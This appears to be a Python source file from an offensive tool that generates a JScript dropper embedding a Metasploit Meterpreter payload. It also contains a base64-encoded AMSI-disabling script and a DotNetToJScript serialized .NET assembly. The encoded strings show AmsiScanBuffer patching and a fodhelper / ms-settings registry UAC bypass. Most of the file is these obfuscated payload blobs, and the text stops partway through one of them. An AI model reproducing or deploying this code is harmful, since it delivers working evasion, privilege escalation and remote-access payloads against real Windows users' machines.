import os
import base64
import argparse
from makerunner import gen,runner
from makefodhelper import writefodhelper

def copy(runfilename,payfilepath,payfilename):
    os.system("cp %s %s%s" % (runfilename,payfilepath,payfilename))
    print ('[+] %s copied to %s%s' % (runfilename,payfilepath,payfilename))
    pass

def writejs(bitness,pformat,uacbypass,lhost):
    amsi = "dmFyIHNoID0gbmV3IEFjdGl2ZVhPYmplY3QoJ1dTY3JpcHQuU2hlbGwnKTsKdmFyIGtleSA9ICJIS0NVXFxTb2Z0d2FyZVxcTWljcm9zb2Z0XFxXaW5kb3dzIFNjcmlwdFxcU2V0dGluZ3NcXEFtIisic2kiKyJFbmFibGUiOwoKdHJ5ewogICAgdmFyIFNpYW1FbmFibGUgPSBzaC5SZWdSZWFkKGtleSk7CiAgICBpZihTaWFtRW5hYmxlIT0wKXsKICAgIHRocm93IG5ldyBFcnJvcigxLCAnJyk7CiAgICB9Cn1jYXRjaChlKXsKICAgIHNoLlJlZ1dyaXRlKGtleSwgMCwgIlJFR19EV09SRCIpOyAvLyBuZXV0ZXIgU0lBTQogICAgc2guUnVuKCJjc2NyaXB0IC1lOntGNDE0QzI2Mi02QUMwLTExQ0YtQjZEMS0wMEFBMDBCQkJCNTh9ICIrV1NjcmlwdC5TY3JpcHRGdWxsTmFtZSwwLDEpOyAvLyBibG9ja2luZyBjYWxsIHRvIFJ1bigpCiAgICBzaC5SZWdXcml0ZShrZXksIDEsICJSRUdfRFdPUkQiKTsgLy8gcHV0IGl0IGJhY2sKICAgIFdTY3JpcHQuUXVpdCgxKTsKfQ=="

    if uacbypass == "0":
        upper = ""
        lower = "by5nb2dvKHNjKTsKfSBjYXRjaCAoZSkgewogICAgZGVidWcoZS5tZXNzYWdlKTsKfQ=="

        msffilename = "met%s.%s" % (bitness,pformat)
        runfilename = "run.js"

        m = open(msffilename,'rb')
        msf = m.read()
        msf_b64 = base64.b64encode(msf).decode()
        data = "\n\tvar sc = \"%s\"" % msf_b64

    if uacbypass == "1":
        upper = "ZnVuY3Rpb24gc2V0dmVyc2lvbigpIHsKbmV3IEFjdGl2ZVhPYmplY3QoJ1dTY3JpcHQuU2hlbGwnKS5FbnZpcm9ubWVudCgnUHJvY2VzcycpKCdDT01QTFVTX1ZlcnNpb24nKSA9ICd2NC4wLjMwMzE5JzsKfQpmdW5jdGlvbiBkZWJ1ZyhzKSB7fQpmdW5jdGlvbiBiYXNlNjRUb1N0cmVhbShiKSB7Cgl2YXIgZW5jID0gbmV3IEFjdGl2ZVhPYmplY3QoIlN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmciKTsKCXZhciBsZW5ndGggPSBlbmMuR2V0Qnl0ZUNvdW50XzIoYik7Cgl2YXIgYmEgPSBlbmMuR2V0Qnl0ZXNfNChiKTsKCXZhciB0cmFuc2Zvcm0gPSBuZXcgQWN0aXZlWE9iamVjdCgiU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5Gcm9tQmFzZTY0VHJhbnNmb3JtIik7CgliYSA9IHRyYW5zZm9ybS5UcmFuc2Zvcm1GaW5hbEJsb2NrKGJhLCAwLCBsZW5ndGgpOwoJdmFyIG1zID0gbmV3IEFjdGl2ZVhPYmplY3QoIlN5c3RlbS5JTy5NZW1vcnlTdHJlYW0iKTsKCW1zLldyaXRlKGJhLCAwLCAobGVuZ3RoIC8gNCkgKiAzKTsKCW1zLlBvc2l0aW9uID0gMDsKCXJldHVybiBtczsKfQoKdmFyIHNlcmlhbGl6ZWRfb2JqID0gIkFBRUFBQUQvLy8vL0FRQUFBQUFBQUFBRUFRQUFBQ0pUZVhOMFpXMHVSR1ZzWldkaGRHVlRaWEpwWVd4cGVtRjBhVzl1U0c5c1pHVnkiKwoiQXdBQUFBaEVaV3hsWjJGMFpRZDBZWEpuWlhRd0IyMWxkR2h2WkRBREF3TXdVM2x6ZEdWdExrUmxiR1ZuWVhSbFUyVnlhV0ZzYVhwaCIrCiJkR2x2YmtodmJHUmxjaXRFWld4bFoyRjBaVVZ1ZEhKNUlsTjVjM1JsYlM1RVpXeGxaMkYwWlZObGNtbGhiR2w2WVhScGIyNUliMnhrIisKIlpYSXZVM2x6ZEdWdExsSmxabXhsWTNScGIyNHVUV1Z0WW1WeVNXNW1iMU5sY21saGJHbDZZWFJwYjI1SWIyeGtaWElKQWdBQUFBa0QiKwoiQUFBQUNRUUFBQUFFQWdBQUFEQlRlWE4wWlcwdVJHVnNaV2RoZEdWVFpYSnBZV3hwZW1GMGFXOXVTRzlzWkdWeUswUmxiR1ZuWVhSbCIrCiJSVzUwY25rSEFBQUFCSFI1Y0dVSVlYTnpaVzFpYkhrR2RHRnlaMlYwRW5SaGNtZGxkRlI1Y0dWQmMzTmxiV0pzZVE1MFlYSm5aWFJVIisKImVYQmxUbUZ0WlFwdFpYUm9iMlJPWVcxbERXUmxiR1ZuWVhSbFJXNTBjbmtCQVFJQkFRRURNRk41YzNSbGJTNUVaV3hsWjJGMFpWTmwiKwoiY21saGJHbDZZWFJwYjI1SWIyeGtaWElyUkdWc1pXZGhkR1ZGYm5SeWVRWUZBQUFBTDFONWMzUmxiUzVTZFc1MGFXMWxMbEpsYlc5MCIrCiJhVzVuTGsxbGMzTmhaMmx1Wnk1SVpXRmtaWEpJWVc1a2JHVnlCZ1lBQUFCTGJYTmpiM0pzYVdJc0lGWmxjbk5wYjI0OU1pNHdMakF1IisKIk1Dd2dRM1ZzZEhWeVpUMXVaWFYwY21Gc0xDQlFkV0pzYVdOTFpYbFViMnRsYmoxaU56ZGhOV00xTmpFNU16UmxNRGc1QmdjQUFBQUgiKwoiZEdGeVoyVjBNQWtHQUFBQUJna0FBQUFQVTNsemRHVnRMa1JsYkdWbllYUmxCZ29BQUFBTlJIbHVZVzFwWTBsdWRtOXJaUW9FQXdBQSIrCiJBQ0pUZVhOMFpXMHVSR1ZzWldkaGRHVlRaWEpwWVd4cGVtRjBhVzl1U0c5c1pHVnlBd0FBQUFoRVpXeGxaMkYwWlFkMFlYSm5aWFF3IisKIkIyMWxkR2h2WkRBREJ3TXdVM2x6ZEdWdExrUmxiR1ZuWVhSbFUyVnlhV0ZzYVhwaGRHbHZia2h2YkdSbGNpdEVaV3hsWjJGMFpVVnUiKwoiZEhKNUFpOVRlWE4wWlcwdVVtVm1iR1ZqZEdsdmJpNU5aVzFpWlhKSmJtWnZVMlZ5YVdGc2FYcGhkR2x2YmtodmJHUmxjZ2tMQUFBQSIrCiJDUXdBQUFBSkRRQUFBQVFFQUFBQUwxTjVjM1JsYlM1U1pXWnNaV04wYVc5dUxrMWxiV0psY2tsdVptOVRaWEpwWVd4cGVtRjBhVzl1IisKIlNHOXNaR1Z5QmdBQUFBUk9ZVzFsREVGemMyVnRZbXg1VG1GdFpRbERiR0Z6YzA1aGJXVUpVMmxuYm1GMGRYSmxDazFsYldKbGNsUjUiKwoiY0dVUVIyVnVaWEpwWTBGeVozVnRaVzUwY3dFQkFRRUFBd2dOVTNsemRHVnRMbFI1Y0dWYlhRa0tBQUFBQ1FZQUFBQUpDUUFBQUFZUiIrCiJBQUFBTEZONWMzUmxiUzVQWW1wbFkzUWdSSGx1WVcxcFkwbHVkbTlyWlNoVGVYTjBaVzB1VDJKcVpXTjBXMTBwQ0FBQUFBb0JDd0FBIisKIkFBSUFBQUFHRWdBQUFDQlRlWE4wWlcwdVdHMXNMbE5qYUdWdFlTNVliV3hXWVd4MVpVZGxkSFJsY2dZVEFBQUFUVk41YzNSbGJTNVkiKwoiYld3c0lGWmxjbk5wYjI0OU1pNHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajFpTnpkaCIrCiJOV00xTmpFNU16UmxNRGc1QmhRQUFBQUhkR0Z5WjJWME1Ba0dBQUFBQmhZQUFBQWFVM2x6ZEdWdExsSmxabXhsWTNScGIyNHVRWE56IisKIlpXMWliSGtHRndBQUFBUk1iMkZrQ2c4TUFBQUFBQm9BQUFKTldwQUFBd0FBQUFRQUFBRC8vd0FBdUFBQUFBQUFBQUJBQUFBQUFBQUEiKwoiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFDQUFBQUFEaCs2RGdDMENjMGh1QUZNelNGVWFHbHpJSEJ5YjJkeSIrCiJZVzBnWTJGdWJtOTBJR0psSUhKMWJpQnBiaUJFVDFNZ2JXOWtaUzRORFFva0FBQUFBQUFBQUZCRkFBQmtoZ0lBTUVYMllBQUFBQUFBIisKIkFBQUE4QUFpSUFzQ01BQUFFZ0FBQUFZQUFBQUFBQUFBQUFBQUFDQUFBQUFBQUlBQkFBQUFBQ0FBQUFBQ0FBQUVBQUFBQUFBQUFBUUEiKwoiQUFBQUFBQUFBR0FBQUFBQ0FBQUFBQUFBQXdCQWhRQUFRQUFBQUFBQUFFQUFBQUFBQUFBQUFCQUFBQUFBQUFBZ0FBQUFBQUFBQUFBQSIrCiJBQkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUVBQUFBd0VBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQWtNQUFBIisKIkhBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEiKwoiQUFBQUFDQUFBRWdBQUFBQUFBQUFBQUFBQUM1MFpYaDBBQUFBWkJFQUFBQWdBQUFBRWdBQUFBSUFBQUFBQUFBQUFBQUFBQUFBQUNBQSIrCiJBR0F1Y25OeVl3QUFBQXdFQUFBQVFBQUFBQVlBQUFBVUFBQUFBQUFBQUFBQUFBQUFBQUJBQUFCQUFBQUFBQUFBQUFBQUFBQUFBQUFBIisKIkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUVnQUFBQUNBQVVBV0NFQUFNd09BQUFCQUFBQUFBQUFBQUFBQUFBQUFBQUEiKwoiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFCTXdCUUQ0QUFBQUFRQUFFUUlvRHdBQSIrCiJDbklCQUFCd2NoTUFBSEFLS0FJQUFBWUdLQU1BQUFZTEZnd1pqUklBQUFFbDBBRUFBQVFvRUFBQUNnMEhHUjlBRWdJb0JBQUFCaVlKIisKIkZnY0pqbWtvRVFBQUNnY1pIeUFTQWlnRUFBQUdKbkl4QUFCd0tCSUFBQW9UQkNnVEFBQUtFUVJ2RkFBQUNoTUZmaFVBQUFweVBBTUEiKwoiY0JkdkZnQUFDaVZ5WUFNQWNHOFhBQUFLSm40VkFBQUtjcDREQUhBWGJ4WUFBQW9sY3Y0REFIQnlIZ1FBY0c4WUFBQUtKWEllQkFCdyIrCiJFUVZ2R0FBQUNtOFpBQUFLY3hvQUFBb2xieHNBQUFvWGJ4d0FBQW9sYnhzQUFBcHlJQVFBY0c4ZEFBQUtieDRBQUFvbUlCQW5BQUFvIisKIkh3QUFDbkprQkFCd2J5QUFBQW9xSWdNb0lRQUFDaVlxQUFBQVFsTktRZ0VBQVFBQUFBQUFEQUFBQUhZeUxqQXVOVEEzTWpjQUFBQUEiKwoiQlFCc0FBQUFpQU1BQUNOK0FBRDBBd0FBekFRQUFDTlRkSEpwYm1kekFBQUFBTUFJQUFCOEJBQUFJMVZUQUR3TkFBQVFBQUFBSTBkViIrCiJTVVFBQUFCTURRQUFnQUVBQUNOQ2JHOWlBQUFBQUFBQUFBSUFBQUZYbFFJMENRSUFBQUQ2QVRNQUZnQUFBUUFBQUI0QUFBQUVBQUFBIisKIkFRQUFBQVlBQUFBTUFBQUFJUUFBQUE4QUFBQUJBQUFBQVFBQUFBSUFBQUFFQUFBQUFRQUFBQUVBQUFBQ0FBQUFBUUFBQUFBQUFBTUIiKwoiQUFBQUFBQUdBQk1DbmdNR0FJQUNuZ01HQUdBQmJBTVBBTDREQUFBR0FJZ0JHd01HQVBZQkd3TUdBTmNCR3dNR0FHY0NHd01HQURNQyIrCiJHd01HQUV3Q0d3TUdBSjhCR3dNR0FIUUJmd01HQUZJQmZ3TUdBTG9CR3dNR0FCSUVGQU1HQURjQm5nTUdBQ2NCRkFNR0FKNENGQU1HIisKIkFOVURuZ01HQUhnRUZBTUdBTTRBRkFNR0FPMENmd01HQUVvRUZBTUdBTVFDVWdRR0FNTUVDZ0FHQUpZRUNnQUtBUEVEYkFNS0FFTUQiKwoiYkFNS0FQa0FiQU1HQUxFQXN3SUFBQUFBZ0FBQUFBQUFBUUFCQUFFQUVBRGtBd0FBUFFBQkFBRUFBQUVBQUlrQUFBQTlBQUVBQndBVCIrCiJBUUFBR2dBQUFFVUFBZ0FIQURNQk5nQ0JBQUFBQUFDQUFKWWdZd1NGQUFFQUFBQUFBSUFBbGlDM0JJMEFCUUFBQUFBQWdBQ1dJUGtEIisKImtnQUdBQUFBQUFDQUFKWWdLQVNZQUFnQVNDQUFBQUFBaGhobUF3WUFEQUJNSVFBQUFBQ0dBTzRERUFBTUFBQUFBUUM0QUFBQUFnQmUiKwoiQkFBQUF3QXRBd0FBQkFETkF3QUFBUUFpQVFBQUFRRGhBQUFBQWdBTUFRQUFBUUFJQkFBQUFnQ3NBZ0FBQXdBM0JBSUFCQUFaQkFBQSIrCiJBUURvQWdrQVpnTUJBQkVBWmdNR0FCa0FaZ01LQUNrQVpnTVFBREVBWmdNUUFEa0FaZ01RQUVFQVpnTVFBRWtBWmdNUUFGRUFaZ01RIisKIkFGa0FaZ01RQUdFQVpnTVZBR2tBWmdNUUFIRUFaZ01RQUlFQVpnTUdBSGtBWmdNR0FKa0FiZ1FsQUxFQXNnUXRBTGtBelFJMkFNRUEiKwoiZHdBOEFNRUEzZ0pCQU1rQVdnTkhBTkVBaXdSTEFORUFmZ1JTQU5FQW93SllBTkVBTVFFR0FOa0FaZ01HQU5rQU5RTmVBT0VBNlFCaiIrCiJBT0VBRlFFUUFOa0FSQVJwQVBFQVZBTnRBTkVBdlFBUUFOa0FSQVJ5QUM0QUN3Q2hBQzRBRXdDcUFDNEFHd0RKQUM0QUl3RFNBQzRBIisKIkt3RG5BQzRBTXdBUkFTNEFPd0FSQVM0QVF3RFNBQzRBU3dBWEFTNEFVd0FSQVM0QVd3QVJBUzRBWXdBOEFTNEFhd0JtQVVNQVd3QnoiKwoiQVdNQWN3QjVBUUVBQXdBQUFBUUFHZ0QxQWdFQVJnRURBR01FQVFBQUFRVUF0d1FDQUFBQkJ3RDVBd0lBQUFFSkFDZ0VBZ0JjTVFBQSIrCiJBUUFFZ0FBQUFRQUFBQUFBQUFBQUFBQUFBQUNpQkFBQUFnQUFBQUFBQUFBQUFBQUFlQUNvQUFBQUFBQUNBQUFBQUFBQUFBQUFBQUI0IisKIkFCUURBQUFBQUFRQUF3QUFBQUJyWlhKdVpXd3pNZ0JOYVdOeWIzTnZablF1VjJsdU16SUFYMTlUZEdGMGFXTkJjbkpoZVVsdWFYUlUiKwoiZVhCbFUybDZaVDB6QUVRek16UTVNamhGT1VRME1UWXlPVUkyUkRkRFFUaERSRUpHTmpSQ01UaEVOemxFUmtRMFJUTTJPVGd3UkVNdyIrCiJRMEV3TkRrMU16VXhPRFkwTkRkR01UY0FaMlYwWDFWVVJqZ0FQRTF2WkhWc1pUNEFQRkJ5YVhaaGRHVkpiWEJzWlcxbGJuUmhkR2x2IisKImJrUmxkR0ZwYkhNK0FHMXpZMjl5YkdsaUFGUm9jbVZoWkFCb1YyNWtBRVJsYkdWMFpWTjFZa3RsZVZSeVpXVUFVblZ1ZEdsdFpVWnAiKwoiWld4a1NHRnVaR3hsQUdoTmIyUjFiR1VBYzJWMFgxZHBibVJ2ZDFOMGVXeGxBRkJ5YjJObGMzTlhhVzVrYjNkVGRIbHNaUUJ3Y205aiIrCiJUbUZ0WlFCelpYUmZSbWxzWlU1aGJXVUFibUZ0WlFCV1lXeDFaVlI1Y0dVQVEyeHZjMlVBUTI5dGNHbHNaWEpIWlc1bGNtRjBaV1JCIisKImRIUnlhV0oxZEdVQVIzVnBaRUYwZEhKcFluVjBaUUJFWldKMVoyZGhZbXhsUVhSMGNtbGlkWFJsQUVOdmJWWnBjMmxpYkdWQmRIUnkiKwoiYVdKMWRHVUFRWE56WlcxaWJIbFVhWFJzWlVGMGRISnBZblYwWlFCQmMzTmxiV0pzZVZSeVlXUmxiV0Z5YTBGMGRISnBZblYwWlFCQiIrCiJjM05sYldKc2VVWnBiR1ZXWlhKemFXOXVRWFIwY21saWRYUmxBRUZ6YzJWdFlteDVRMjl1Wm1sbmRYSmhkR2x2YmtGMGRISnBZblYwIisKIlpRQkJjM05sYldKc2VVUmxjMk55YVhCMGFXOXVRWFIwY21saWRYUmxBRU52YlhCcGJHRjBhVzl1VW1Wc1lYaGhkR2x2Ym5OQmRIUnkiKwoiYVdKMWRHVUFRWE56WlcxaWJIbFFjbTlrZFdOMFFYUjBjbWxpZFhSbEFFRnpjMlZ0WW14NVEyOXdlWEpwWjJoMFFYUjBjbWxpZFhSbCIrCiJBRUZ6YzJWdFlteDVRMjl0Y0dGdWVVRjBkSEpwWW5WMFpRQlNkVzUwYVcxbFEyOXRjR0YwYVdKcGJHbDBlVUYwZEhKcFluVjBaUUJDIisKImVYUmxBRk5sZEZaaGJIVmxBR1IzVTJsNlpRQlRlWE4wWlcwdVZHaHlaV0ZrYVc1bkFFVnVZMjlrYVc1bkFFWnliMjFDWVhObE5qUlQiKwoiZEhKcGJtY0FSMlYwVTNSeWFXNW5BSEJoZEdnQVRXRnljMmhoYkFCMWMyVnlNekl1Wkd4c0FFVjRZVzF3YkdWQmMzTmxiV0pzZVM1ayIrCiJiR3dBVTNsemRHVnRBRk41YzNSbGJTNVNaV1pzWldOMGFXOXVBR05oY0hScGIyNEFaMlYwWDFOMFlYSjBTVzVtYndCUWNtOWpaWE56IisKIlUzUmhjblJKYm1adkFGTnNaV1Z3QUVOMWNuSmxiblJWYzJWeUFDNWpkRzl5QUZONWMzUmxiUzVFYVdGbmJtOXpkR2xqY3dCVGVYTjAiKwoiWlcwdVVuVnVkR2x0WlM1SmJuUmxjbTl3VTJWeWRtbGpaWE1BVTNsemRHVnRMbEoxYm5ScGJXVXVRMjl0Y0dsc1pYSlRaWEoyYVdObCIrCiJjd0JFWldKMVoyZHBibWROYjJSbGN3QnZjSFJwYjI1ekFGSjFiblJwYldWSVpXeHdaWEp6QUZSbGMzUkRiR0Z6Y3dCU2RXNVFjbTlqIisKIlpYTnpBRWRsZEZCeWIyTkJaR1J5WlhOekFHeHdRV1JrY21WemN3QlBZbXBsWTNRQWJIQm1iRTlzWkZCeWIzUmxZM1FBVm1seWRIVmgiKwoiYkZCeWIzUmxZM1FBWm14T1pYZFFjbTkwWldOMEFGTjBZWEowQUVOdmJuWmxjblFBVTNsemRHVnRMbFJsZUhRQWRHVjRkQUJOWlhOeiIrCiJZV2RsUW05NEFFbHVhWFJwWVd4cGVtVkJjbkpoZVFCRGNtVmhkR1ZUZFdKTFpYa0FUM0JsYmxOMVlrdGxlUUJTWldkcGMzUnllVXRsIisKImVRQkZlR0Z0Y0d4bFFYTnpaVzFpYkhrQVEyOXdlUUJNYjJGa1RHbGljbUZ5ZVFCU1pXZHBjM1J5ZVFBQUVXRUFiUUJ6QUdrQUxnQmsiKwoiQUd3QWJBQUFIVUVBYlFCekFHa0FVd0JqQUdFQWJnQkNBSFVBWmdCbUFHVUFjZ0FBZ3dsakFHNEFWZ0IxQUZvQVJ3QjRBSE1BVFFCNiIrCiJBRWtBWndCVkFEQUFhQUJHQUZRQVJRQjNBSG9BVFFCcEFEVUFSUUJVQUVVQWR3QnpBRlVBTWdCb0FHd0FZZ0JIQUhnQVJnQmxBRWNBIisKIlZnQnFBRmdBTVFCS0FERUFZZ0JyQUZJQVRRQlVBRU1BUVFCcEFGa0FNZ0F4QUdzQVNRQnBBRUVBYVFCTUFESUFUUUJuQUdNQVJnQTEiKwoiQUhZQVdBQnVBR1FBWlFCYUFGWUFOUUI1QUdNQU1RQTFBRzhBV0FCdEFGWUFaUUJpQUVjQWR3QjFBRm9BV0FCb0FHd0FTUUJIQUd3QSIrCiJiQUJsQUVNQVp3QnZBR0lBYlFCV0FETUFUQUJYQURrQWFRQmhBRzBBVmdCcUFHUUFRd0JDQUhVQVdnQllBRkVBZFFCa0FESUFWZ0JwIisKIkFGa0FNZ0I0QUhBQVdnQlhBRFVBTUFCTEFGTUFOUUJyQUdJQU13QmtBSFVBWWdCSEFEa0FhQUJhQUVnQVRnQXdBR01BYlFCc0FIVUEiKwoiV2dCNUFHZ0FZZ0JWQURNQWJBQjZBR1FBUndCV0FIUUFUQUJzQUZJQWJBQmxBRWdBVVFCMUFGSUFWd0ExQUdvQVlnQXlBRklBY0FCaSIrCiJBRzBBWkFCa0FFOEFhZ0J3QUVJQVZRQXdBRTRBU2dCVEFGTUFOUUJJQUZvQVdBQlNBRlFBWkFCSUFFb0FjQUJpQUcwQVl3QnZBRmNBIisKIk1nQk9BRzhBV1FCWUFFb0FZZ0JZQUZZQU1RQkJBRXNBUkFCRkFIY0FUZ0JEQUVFQWN3QkpBRVFBUlFCNEFFNEFhUUJCQUhNQVRRQlUiKwoiQUVVQU1nQkpBRU1BZHdCNEFFMEFWQUJKQUdjQVRBQkVBRlVBTkFCTUFFUUFVUUF6QUVrQVF3QjNBR2NBVGdCRUFHTUFjd0JKQUVRQSIrCiJVUUExQUVrQVF3QjNBREVBVGdCNUFIY0Fad0JPQUZRQVFRQnpBRWtBUkFCUkFESUFUQUJFQUZFQU5RQk1BRU1BUVFBeEFFNEFRd0JCIisKIkFITUFTUUJFQUZVQU1nQk1BRVFBVVFBeUFFa0FRd0IzQURBQVR3QlRBRUVBY3dCT0FGUUFSUUJ6QUU0QVZBQk5BR2NBVEFCRUFGRUEiKwoiTWdCTUFFTUFRUUF4QUU0QVV3QkJBSE1BVGdCRUFHTUFjd0JOQUZRQVJRQXdBRXdBUkFCRkFIZ0FUZ0I1QUhjQVp3Qk5BRlFBUlFCMyIrCiJBRXdBUXdCQkFEQUFUZ0JwQUhjQVp3Qk5BRlFBUlFBeUFFa0FRd0IzQUdjQVRRQlVBRWtBZHdCSkFFTUFkd0I0QUUwQVZBQlpBSEFBIisKIlN3QlRBR3NBY0FCSkFHY0FQUUE5QUFBalV3QnZBR1lBZEFCM0FHRUFjZ0JsQUZ3QVF3QnNBR0VBY3dCekFHVUFjd0JjQUFBOWJRQnoiKwoiQUMwQWN3QmxBSFFBZEFCcEFHNEFad0J6QUZ3QVV3Qm9BR1VBYkFCc0FGd0FUd0J3QUdVQWJnQmNBR01BYndCdEFHMEFZUUJ1QUdRQSIrCiJBVjlUQUc4QVpnQjBBSGNBWVFCeUFHVUFYQUJEQUd3QVlRQnpBSE1BWlFCekFGd0FiUUJ6QUMwQWN3QmxBSFFBZEFCcEFHNEFad0J6IisKIkFGd0FVd0JvQUdVQWJBQnNBRndBVHdCd0FHVUFiZ0JjQUdNQWJ3QnRBRzBBWVFCdUFHUUFBUjlFQUdVQWJBQmxBR2NBWVFCMEFHVUEiKwoiUlFCNEFHVUFZd0IxQUhRQVpRQUFBUUJEUXdBNkFGd0Fkd0JwQUc0QVpBQnZBSGNBY3dCY0FITUFlUUJ6QUhRQVpRQnRBRE1BTWdCYyIrCiJBR1lBYndCa0FHZ0FaUUJzQUhBQVpRQnlBQzRBWlFCNEFHVUFBQmR0QUhNQUxRQnpBR1VBZEFCMEFHa0FiZ0JuQUhNQUFZWEwza3V4IisKIk80UkVvcm1wZy9yZ3dGTUFCQ0FCQVFnRElBQUJCU0FCQVJFUkJDQUJBUTRFSUFFQkFnb0hCZzRZQ1IwRkhRVU9Cd0FDQVJKUkVWVUkiKwoiQUFRQkhRVUlHQWdGQUFFZEJRNEVBQUFTWVFVZ0FRNGRCUU1HRW1rR0lBSVNhUTRDQlNBQkVta09CU0FDQVE0Y0JDQUFFbkVGSUFFQiIrCiJFWFVESUFBQ0JBQUJBUWdGQUFFU2JRNEl0M3BjVmhrMDRJa0RCaEVRQndBRUNCZ09EZ2dFQUFFWURnVUFBaGdZRGdnQUJBSVlDUWtRIisKIkNRZ0JBQWdBQUFBQUFCNEJBQUVBVkFJV1YzSmhjRTV2YmtWNFkyVndkR2x2YmxSb2NtOTNjd0VJQVFBQ0FBQUFBQUFVQVFBUFJYaGgiKwoiYlhCc1pVRnpjMlZ0WW14NUFBQXBBUUFrUlhoaGJYQnNaU0JCYzNObGJXSnNlU0JtYjNJZ1JHOTBUbVYwVkc5S1UyTnlhWEIwQUFBRiIrCiJBUUFBQUFBa0FRQWZRMjl3ZVhKcFoyaDBJTUtwSUVwaGJXVnpJRVp2Y25Ob1lYY2dNakF4TndBQUtRRUFKRFUyTlRrNFpqRmpMVFprIisKIk9EZ3RORGs1TkMxaE16a3lMV0ZtTXpNM1lXSmxOVGMzTndBQURBRUFCekV1TUM0d0xqQUFBQVVCQUFFQUFBUUJBQUFBQUFBQUFBQUEiKwoiTUVYMllBQUFBQUFDQUFBQUhBRUFBRUF3QUFCQUVnQUFVbE5FVXdGRnVJY3NrU3hNaWwxWEpybi96UFVCQUFBQVhGd3hPVEl1TVRZNCIrCiJMakV6TlM0M1hIWnBjM1ZoYkhOMGRXUnBiMXhFYjNST1pYUlViMHBUWTNKcGNIUmNSWGhoYlhCc1pVRnpjMlZ0WW14NVhHOWlhbHg0IisKIk5qUmNVbVZzWldGelpWeEZlR0Z0Y0d4bFFYTnpaVzFpYkhrdWNHUmlBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEiKwoiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIrCiJBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBIisKIkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUJJTWNBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEiKwoiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIrCiJBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBIisKIkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBUUFRQUFBQUdBQUFnQUFBQUFBQUFBQUFBQUFBQUFBQUFRQUIiKwoiQUFBQU1BQUFnQUFBQUFBQUFBQUFBQUFBQUFBQUFRQUFBQUFBU0FBQUFGaEFBQUN3QXdBQUFBQUFBQUFBQUFDd0F6UUFBQUJXQUZNQSIrCiJYd0JXQUVVQVVnQlRBRWtBVHdCT0FGOEFTUUJPQUVZQVR3QUFBQUFBdlFUdi9nQUFBUUFBQUFFQUFBQUFBQUFBQVFBQUFBQUFQd0FBIisKIkFBQUFBQUFFQUFBQUFnQUFBQUFBQUFBQUFBQUFBQUFBQUVRQUFBQUJBRllBWVFCeUFFWUFhUUJzQUdVQVNRQnVBR1lBYndBQUFBQUEiKwoiSkFBRUFBQUFWQUJ5QUdFQWJnQnpBR3dBWVFCMEFHa0Fid0J1QUFBQUFBQUFBTEFFRUFNQUFBRUFVd0IwQUhJQWFRQnVBR2NBUmdCcCIrCiJBR3dBWlFCSkFHNEFaZ0J2QUFBQTdBSUFBQUVBTUFBd0FEQUFNQUF3QURRQVlnQXdBQUFBWWdBbEFBRUFRd0J2QUcwQWJRQmxBRzRBIisKImRBQnpBQUFBUlFCNEFHRUFiUUJ3QUd3QVpRQWdBRUVBY3dCekFHVUFiUUJpQUd3QWVRQWdBR1lBYndCeUFDQUFSQUJ2QUhRQVRnQmwiKwoiQUhRQVZBQnZBRW9BVXdCakFISUFhUUJ3QUhRQUFBQUFBQ0lBQVFBQkFFTUFid0J0QUhBQVlRQnVBSGtBVGdCaEFHMEFaUUFBQUFBQSIrCiJBQUFBQUVnQUVBQUJBRVlBYVFCc0FHVUFSQUJsQUhNQVl3QnlBR2tBY0FCMEFHa0Fid0J1QUFBQUFBQkZBSGdBWVFCdEFIQUFiQUJsIisKIkFFRUFjd0J6QUdVQWJRQmlBR3dBZVFBQUFEQUFDQUFCQUVZQWFRQnNBR1VBVmdCbEFISUFjd0JwQUc4QWJnQUFBQUFBTVFBdUFEQUEiKwoiTGdBd0FDNEFNQUFBQUVnQUZBQUJBRWtBYmdCMEFHVUFjZ0J1QUdFQWJBQk9BR0VBYlFCbEFBQUFSUUI0QUdFQWJRQndBR3dBWlFCQiIrCiJBSE1BY3dCbEFHMEFZZ0JzQUhrQUxnQmtBR3dBYkFBQUFHSUFId0FCQUV3QVpRQm5BR0VBYkFCREFHOEFjQUI1QUhJQWFRQm5BR2dBIisKImRBQUFBRU1BYndCd0FIa0FjZ0JwQUdjQWFBQjBBQ0FBcVFBZ0FFb0FZUUJ0QUdVQWN3QWdBRVlBYndCeUFITUFhQUJoQUhjQUlBQXkiKwoiQURBQU1RQTNBQUFBQUFBcUFBRUFBUUJNQUdVQVp3QmhBR3dBVkFCeUFHRUFaQUJsQUcwQVlRQnlBR3NBY3dBQUFBQUFBQUFBQUZBQSIrCiJGQUFCQUU4QWNnQnBBR2NBYVF